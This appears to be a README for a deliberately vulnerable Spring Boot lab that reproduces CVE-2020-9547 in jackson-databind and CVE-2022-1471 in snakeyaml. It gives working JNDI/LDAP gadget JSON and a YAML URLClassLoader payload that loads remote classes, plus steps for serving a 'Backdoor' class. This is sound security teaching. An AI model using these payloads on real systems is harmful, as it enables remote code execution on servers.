# Deserialization vulnerabilities in jackson-databind and snakeyaml

## Background

Deserialization vulnerabilities in jackson-databind are exploitable if the following conditions hold:
- Polymorphic type handling has been enabled for jackson-databind (see [here](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062) or [here](https://snyk.io/blog/java-json-deserialization-problems-jackson-objectmapper/))
- A gadget class, which loads Java classes through JNDI, is in the classpath and has not yet been blocked by the deny-list implemented in jackson-databind
- The system property `trustURLCodebase` is true, either because the application runs on an old Java version or it has been set explicitely (see [here](https://www.rapid7.com/blog/post/2021/12/10/widespread-exploitation-of-critical-remote-code-execution-in-apache-log4j/))

## Prerequisites

1. Install Java 8+ and Maven
2. Install server toolkit from https://github.com/welk1n/JNDI-Injection-Exploit in folder `lib`

## Run the application

1. Build the Spring Boot app with `mvn clean package`
2. Start it with `java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar target/springboot-app-0.0.1-SNAPSHOT.jar`
    - Note: The system property is required on recent Java versions.
3. Get JSON with `curl http://localhost:8080/persons/foo`
4. Post legitimate JSON

```
curl -i -X POST -H 'Content-type:application/json;charset=UTF-8' http://localhost:8080/persons -d '
{ "id" : 2,
  "firstname" : "John",
  "lastname" : "Doe",
  "createdAt" : "2024-02-19T10:35:20.867+0000",
  "modifiedAt" : "2024-02-19T10:35:20.867+0000"
}'
```
4. Post legitimate YAML

```
curl -i -X POST -H 'Content-type:text/plain;charset=UTF-8' http://localhost:8080/persons -d 'id: 2
firstname: John
lastname: Doe'
```

## Exploit CVE-2020-9547 in jackson-databind
<!--
1. Start a Web server to host the `com.acme.backdoor.Backdoor`

```
python3 -m http.server 9000 --directory target/test-classes
```

2. Start an LDAP server that redirects to the Web server

````sh
mvn dependency:copy-dependencies
java -cp target/dependency/unboundid-ldapsdk-3.1.1.jar:target/test-classes \
    com.acme.jndi.LDAPRefServer \
    http://localhost:9000#com.acme.backdoor.Backdoor
````-->

One gadget class of this vulnerability is `br.com.anteros.dbcp.AnterosDBCPConfig` (see [here](https://github.com/fairyming/CVE-2020-9547/blob/master/Poc.java)).

1. Run the LDAP and Web server with `java -jar lib/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open -a Safari http://www.google.de" -A "127.0.0.1"`

    - The command specified with `-C` will be executed by the Spring Boot application upon deserialization.
    - Copy one of the `ldap://` URLs shown in the console.

2. Post a JSON that causes jackson-databind to deserialize the gadget class, which downloads and initializes the backdoor (this only works because the attribute `Person#modifiedAt` is of type `Object`, which is where the polymorphic type handling kicks in).

```
curl -i -X POST -H 'Content-type:application/json;charset=UTF-8' http://localhost:8080/persons -d '
{ "id" : 2,
  "firstname" : "John",
  "lastname" : "Doe",
  "createdAt" : "2024-02-19T10:35:20.867+0000",
  "modifiedAt" : ["br.com.anteros.dbcp.AnterosDBCPConfig", {"healthCheckRegistry": "<ldap-url>"}]
}'
```

## Exploit CVE-2022-1471 in snakeyaml

2. Post a YAML like follows (replace Jetty URL before). The exploit succeeds if you see an HTTP request being made to the Jetty server

```
curl -i -X POST -H 'Content-type:text/plain;charset=UTF-8' http://localhost:8080/persons -d 'id: 2
firstname: John
lastname: Doe
modifiedAt: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["<jetty-url>"]]]]'
```

## Exploit other Jackson vulnerabilities

- Edit the `pom.xml` to declare dependencies on JARs that include the respective gadget classes.
- Change the names of the gadget class and attribute in the JSON payload.

## References

- LDAP and Web servers to serve a dummy class upon deserialization
    - https://github.com/welk1n/JNDI-Injection-Exploit
    - https://github.com/mbechler/marshalsec
- Background on JSON deserialization
    - https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062
    - https://snyk.io/blog/java-json-deserialization-problems-jackson-objectmapper/
    - https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
    - https://github.com/mbechler/marshalsec/blob/master/README.md
- Snakeyaml
    - https://github.com/falconkei/snakeyaml_cve_poc
    - https://www.baeldung.com/jackson-yaml